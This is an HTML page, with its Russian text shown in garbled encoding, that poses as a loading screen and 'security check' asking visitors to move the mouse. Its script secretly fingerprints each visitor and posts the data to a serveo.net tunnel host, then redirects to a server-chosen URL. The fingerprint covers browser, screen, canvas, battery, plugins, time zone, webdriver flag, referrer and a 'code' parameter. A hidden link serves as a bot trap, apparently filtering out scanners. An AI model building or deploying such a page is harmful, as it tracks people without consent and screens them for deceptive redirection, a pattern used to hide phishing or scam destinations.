<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–ó–∞–≥—Ä—É–∑–∫–∞...</title>
    <style>
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background-color: #f5f5f5;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            padding: 0;
            color: #333;
            overflow: hidden;
        }

        .loader-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            margin-bottom: 30px;
        }

        .loader {
            border: 4px solid rgba(0, 0, 0, 0.1);
            border-left: 4px solid #4285f4;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1.2s linear infinite;
            margin-bottom: 20px;
        }

        .loading-text {
            font-size: 22px;
            font-weight: 500;
            color: #333;
            margin-bottom: 10px;
        }

        .human-verification {
            background: linear-gradient(145deg, #ffffff, #f0f0f0);
            border-radius: 16px;
            padding: 25px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.08), 
                        0 6px 12px rgba(0, 0, 0, 0.05), 
                        inset 0 -3px 0 rgba(0, 0, 0, 0.05);
            text-align: center;
            max-width: 340px;
            transition: all 0.5s ease-in-out, transform 0.3s ease;
            opacity: 1;
            transform: translateY(0);
            position: relative;
            overflow: hidden;
            z-index: 10;
        }

        .human-verification.hidden {
            opacity: 0;
            transform: translateY(20px);
            pointer-events: none;
        }

        .human-verification h3 {
            margin-top: 0;
            margin-bottom: 15px;
            color: #4285f4;
            font-size: 24px;
            font-weight: 600;
        }

        .human-verification p {
            margin-bottom: 20px;
            font-size: 16px;
            line-height: 1.5;
            color: #5f6368;
        }

        .mouse-icon {
            display: inline-block;
            width: 40px;
            height: 60px;
            border: 3px solid #4285f4;
            border-radius: 20px;
            position: relative;
            margin: 0 auto 15px;
        }

        .mouse-icon:before {
            content: '';
            position: absolute;
            width: 8px;
            height: 8px;
            background: #4285f4;
            border-radius: 50%;
            top: 10px;
            left: 50%;
            transform: translateX(-50%);
            animation: mousescroll 2s infinite;
        }

        .pulse-effect {
            position: absolute;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            background: radial-gradient(circle, rgba(66, 133, 244, 0.3) 0%, rgba(66, 133, 244, 0) 70%);
            border-radius: 16px;
            opacity: 0;
            animation: pulse 2s infinite;
            pointer-events: none;
        }

        .bot-trap-link {
            position: absolute;
            opacity: 0;
            pointer-events: none;
            font-size: 0;
            height: 0;
            width: 0;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @keyframes pulse {
            0% { transform: scale(0.95); opacity: 0; }
            50% { transform: scale(1); opacity: 0.6; }
            100% { transform: scale(1.05); opacity: 0; }
        }

        @keyframes mousescroll {
            0% { opacity: 1; top: 10px; }
            50% { opacity: 1; top: 25px; }
            100% { opacity: 0; top: 30px; }
        }

        /* –°—Ç–∏–ª–∏ –¥–ª—è –º–æ–±–∏–ª—å–Ω—ã—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤ */
        @media (max-width: 768px) {
            .human-verification {
                width: 85%;
                max-width: 300px;
                padding: 20px;
            }
            
            .loader {
                width: 50px;
                height: 50px;
            }
            
            .loading-text {
                font-size: 18px;
            }
            
            .human-verification h3 {
                font-size: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="loader-container">
        <div class="loader"></div>
        <div class="loading-text">–ó–∞–≥—Ä—É–∑–∫–∞...</div>
    </div>

    <div class="human-verification">
        <div class="pulse-effect"></div>
        <h3>–ü—Ä–æ–≤–µ—Ä–∫–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏</h3>
        <div class="mouse-icon"></div>
        <p>–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–¥–≤–∏–≥–∞–π—Ç–µ –∫—É—Ä—Å–æ—Ä–æ–º, —á—Ç–æ–±—ã –ø—Ä–æ–¥–æ–ª–∂–∏—Ç—å</p>
    </div>

    <a href="#" class="bot-trap-link">–°–µ–∫—Ä–µ—Ç–Ω–∞—è —Å—Å—ã–ª–∫–∞ —Ç–æ–ª—å–∫–æ –¥–ª—è –±–æ—Ç–æ–≤</a>

    <script>
    (async function() {
        'use strict';

        // ===== –ö–û–ù–°–¢–ê–ù–¢–´ –ò –ò–ù–ò–¶–ò–ê–õ–ò–ó–ê–¶–ò–Ø =====
        const PAGE_LOAD_START = performance.now();
        const SERVER_URL = "https://25e9fc3fa7f203bbe6d45f6fa2a450f6.serveo.net"; // –ë—É–¥–µ—Ç –∑–∞–º–µ–Ω–µ–Ω–æ –Ω–∞ –∞–∫—Ç—É–∞–ª—å–Ω—ã–π URL –æ—Ç Serveo
        
        // –§–ª–∞–≥–∏ —Å–æ—Å—Ç–æ—è–Ω–∏—è
        let botTrapActivated = false;
        let hadMouseMovement = false;
        let redirectInitiated = false;
        let mouseMoveTimeout = null;
        
        // –ü–æ–ª—É—á–µ–Ω–∏–µ —Å—Å—ã–ª–∫–∏ –Ω–∞ –±–ª–æ–∫ –ø—Ä–æ–≤–µ—Ä–∫–∏ —á–µ–ª–æ–≤–µ–∫–∞
        const humanVerificationBlock = document.querySelector('.human-verification');
        
        // –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ —Ç–∏–ø–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        
        // –°—á–µ—Ç—á–∏–∫ –≤–∏–∑–∏—Ç–æ–≤
        let visitCount = parseInt(localStorage.getItem('visitCount') || '0') + 1;
        localStorage.setItem('visitCount', visitCount.toString());

        // ===== –í–°–ü–û–ú–û–ì–ê–¢–ï–õ–¨–ù–´–ï –§–£–ù–ö–¶–ò–ò =====

        /**
         * –ü–æ–ª—É—á–µ–Ω–∏–µ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞ –∏–∑ URL
         */
        function getUrlParameter(name) {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get(name);
        }

        /**
         * –ü–æ–ª—É—á–µ–Ω–∏–µ Canvas Fingerprint
         */
        function getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                canvas.width = 200;
                canvas.height = 50;

                // –ó–∞–ø–æ–ª–Ω–µ–Ω–∏–µ –∫–∞–Ω–≤–∞—Å–∞ —Ç–µ–∫—Å—Ç–æ–º –∏ —Ñ–∏–≥—É—Ä–∞–º–∏
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#00f';
                ctx.fillText('Canvas Fingerprint üëã', 2, 2);
                ctx.fillStyle = '#f00';
                ctx.arc(50, 30, 15, 0, Math.PI * 2, true);
                ctx.fill();

                return canvas.toDataURL().substring(0, 100) + '...';
            } catch (e) {
                return "Canvas –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω";
            }
        }

        /**
         * –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –±–∞—Ç–∞—Ä–µ–µ
         */
        async function getBatteryInfo() {
            if (!navigator.getBattery) return "API –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω";
            
            try {
                const battery = await navigator.getBattery();
                return {
                    level: Math.round(battery.level * 100),
                    charging: battery.charging
                };
            } catch (e) {
                return "–û—à–∏–±–∫–∞ –¥–æ—Å—Ç—É–ø–∞";
            }
        }

        /**
         * –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ø–∞–º—è—Ç–∏ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
         */
        function getDeviceMemory() {
            if (navigator.deviceMemory) {
                return `${navigator.deviceMemory}GB`;
            }
            return "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ";
        }

        /**
         * –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å–µ—Ç–µ–≤–æ–º –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–∏
         */
        function getConnectionInfo() {
            const connection = navigator.connection || 
                              navigator.mozConnection || 
                              navigator.webkitConnection;
            
            if (connection) {
                return {
                    type: connection.effectiveType || "unknown",
                    rtt: connection.rtt || "unknown"
                };
            }
            
            return "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ";
        }

        /**
         * –°–±–æ—Ä –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ
         */
        async function collectUserInfo() {
            const now = performance.now();
            const loadTime = Math.round(now - PAGE_LOAD_START);
            const battery = await getBatteryInfo();
            
            // –ë–∞–∑–æ–≤–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ø–æ—Å–µ—â–µ–Ω–∏–∏
            const info = {
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                language: navigator.language,
                languages: navigator.languages ? navigator.languages.join(',') : "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ",
                platform: navigator.platform,
                deviceType: isMobile ? '–ú–æ–±–∏–ª—å–Ω–æ–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ' : '–î–µ—Å–∫—Ç–æ–ø',
                visitCount: visitCount,
                
                // –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± —ç–∫—Ä–∞–Ω–µ –∏ –æ–∫–Ω–µ
                screen: {
                    width: window.screen.width,
                    height: window.screen.height,
                    colorDepth: window.screen.colorDepth,
                    pixelRatio: window.devicePixelRatio || 1
                },
                window: {
                    innerWidth: window.innerWidth,
                    innerHeight: window.innerHeight,
                    outerWidth: window.outerWidth,
                    outerHeight: window.outerHeight
                },
                
                // –°–µ—Ç–µ–≤–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è
                url: window.location.href,
                referrer: document.referrer || "none",
                
                // –•—Ä–∞–Ω–∏–ª–∏—â–∞ –∏ –∫—É–∫–∏
                cookiesEnabled: navigator.cookieEnabled,
                localStorage: !!window.localStorage,
                sessionStorage: !!window.sessionStorage,
                
                // –ü—Ä–æ–∏–∑–≤–æ–¥–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –∏ –æ–±–æ—Ä—É–¥–æ–≤–∞–Ω–∏–µ
                hardwareConcurrency: navigator.hardwareConcurrency || "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ",
                memory: getDeviceMemory(),
                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                connection: getConnectionInfo(),
                
                // –î–æ–ø. –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –±—Ä–∞—É–∑–µ—Ä–µ
                doNotTrack: navigator.doNotTrack || "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ",
                webdriver: !!navigator.webdriver,
                plugins: Array.from(navigator.plugins || []).map(p => p.name).join(', ') || "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ",
                
                // –£–Ω–∏–∫–∞–ª—å–Ω—ã–µ –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä—ã
                canvas: getCanvasFingerprint(),
                
                // –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ø–æ–≤–µ–¥–µ–Ω–∏–∏
                hadMouseMovement: hadMouseMovement,
                botTrapActivated: botTrapActivated,
                
                // –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
                battery: battery,
                loadTime: loadTime,
                
                // –ü–∞—Ä–∞–º–µ—Ç—Ä—ã URL
                codeParam: getUrlParameter('code')
            };

            return info;
        }

        /**
         * –û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –Ω–∞ —Å–µ—Ä–≤–µ—Ä –∏ –ø–æ–ª—É—á–µ–Ω–∏–µ URL –¥–ª—è –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏—è
         */
        async function checkWithServer(userInfo) {
            try {
                const response = await fetch(SERVER_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(userInfo),
                    credentials: 'omit' // –Ω–µ –æ—Ç–ø—Ä–∞–≤–ª—è—Ç—å –∫—É–∫–∏, —á—Ç–æ–±—ã —É–º–µ–Ω—å—à–∏—Ç—å —Ä–∏—Å–∫–∏
                });
                
                if (!response.ok) {
                    throw new Error(`–°–µ—Ä–≤–µ—Ä –≤–µ—Ä–Ω—É–ª –æ—à–∏–±–∫—É: ${response.status}`);
                }
                
                const data = await response.json();
                return data.redirectUrl;
            } catch (error) {
                console.error("–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –¥–∞–Ω–Ω—ã—Ö –Ω–∞ —Å–µ—Ä–≤–µ—Ä:", error);
                // –í —Å–ª—É—á–∞–µ –æ—à–∏–±–∫–∏ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è–µ–º –Ω–∞ –±–µ–∑–æ–ø–∞—Å–Ω—ã–π URL
                return "https://dzen.ru";
            }
        }

        /**
         * –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –Ω–∞ —Ü–µ–ª–µ–≤—É—é —Å—Ç—Ä–∞–Ω–∏—Ü—É
         */
        function redirect(url) {
            if (redirectInitiated) return;
            redirectInitiated = true;
            
            const delay = isMobile ? 1000 : 500;
            
            setTimeout(() => {
                window.location.href = url;
            }, delay);
        }

        // ===== –û–ë–†–ê–ë–û–¢–ß–ò–ö–ò –°–û–ë–´–¢–ò–ô =====

        // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –¥–≤–∏–∂–µ–Ω–∏—è –º—ã—à–∏
        document.addEventListener('mousemove', () => {
            if (!hadMouseMovement) {
                hadMouseMovement = true;
                
                // –°–∫—Ä—ã–≤–∞–µ–º –±–ª–æ–∫ –ø—Ä–æ–≤–µ—Ä–∫–∏ —á–µ–ª–æ–≤–µ–∫–∞
                humanVerificationBlock.classList.add('hidden');
            }
            
            // –ï—Å–ª–∏ —Ç–∞–π–º–µ—Ä –ø—Ä–æ–≤–µ—Ä–∫–∏ –º—ã—à–∏ –∞–∫—Ç–∏–≤–µ–Ω, –æ—á–∏—â–∞–µ–º –µ–≥–æ
            if (mouseMoveTimeout) {
                clearTimeout(mouseMoveTimeout);
                mouseMoveTimeout = null;
            }
        });

        // –î–ª—è –º–æ–±–∏–ª—å–Ω—ã—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤ —Å–∫—Ä—ã–≤–∞–µ–º –ø—Ä–æ–≤–µ—Ä–∫—É –¥–≤–∏–∂–µ–Ω–∏—è –º—ã—à–∏ –∏ —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Ñ–ª–∞–≥
        if (isMobile) {
            hadMouseMovement = true;
            humanVerificationBlock.classList.add('hidden');
        }

        // –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ª–æ–≤—É—à–∫–∏ –¥–ª—è –±–æ—Ç–æ–≤
        document.querySelector('.bot-trap-link').addEventListener('click', async (e) => {
            e.preventDefault();
            botTrapActivated = true;
            
            const userInfo = await collectUserInfo();
            const redirectUrl = await checkWithServer(userInfo);
            redirect(redirectUrl);
        });

        // –û—Å–Ω–æ–≤–Ω–∞—è –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        window.onload = async () => {
            try {
                // –î–ª—è –º–æ–±–∏–ª—å–Ω—ã—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤ –∑–∞–ø—Ä–∞—à–∏–≤–∞–µ–º —Å–µ—Ä–≤–µ—Ä —Å—Ä–∞–∑—É
                if (isMobile) {
                    const userInfo = await collectUserInfo();
                    const redirectUrl = await checkWithServer(userInfo);
                    redirect(redirectUrl);
                } else {
                    // –î–ª—è –ü–ö —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Ç–∞–π–º–µ—Ä –ø—Ä–æ–≤–µ—Ä–∫–∏ –¥–≤–∏–∂–µ–Ω–∏—è –º—ã—à–∏
                    mouseMoveTimeout = setTimeout(async () => {
                        if (!hadMouseMovement) {
                            const userInfo = await collectUserInfo();
                            const redirectUrl = await checkWithServer(userInfo);
                            redirect(redirectUrl);
                        }
                    }, 7000); // –∂–¥–µ–º 7 —Å–µ–∫—É–Ω–¥ –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –¥–≤–∏–∂–µ–Ω–∏—è –º—ã—à–∏
                    
                    // –¢–∞–∫–∂–µ –∑–∞–ø—É—Å–∫–∞–µ–º —Ç–∞–π–º–µ—Ä –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π, –∫–æ—Ç–æ—Ä—ã–µ –¥–≤–∏–≥–∞—é—Ç –º—ã—à—å—é
                    setTimeout(async () => {
                        if (hadMouseMovement && !redirectInitiated) {
                            const userInfo = await collectUserInfo();
                            const redirectUrl = await checkWithServer(userInfo);
                            redirect(redirectUrl);
                        }
                    }, 1500); // –∂–¥–µ–º 1.5 —Å–µ–∫—É–Ω–¥—ã –ø–æ—Å–ª–µ –¥–≤–∏–∂–µ–Ω–∏—è –º—ã—à—å—é
                }
            } catch (error) {
                console.error("–û—à–∏–±–∫–∞ –≤ –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–µ onload:", error);
                redirect("https://dzen.ru");
            }
        };
    })();
    </script>
</body>
</html>
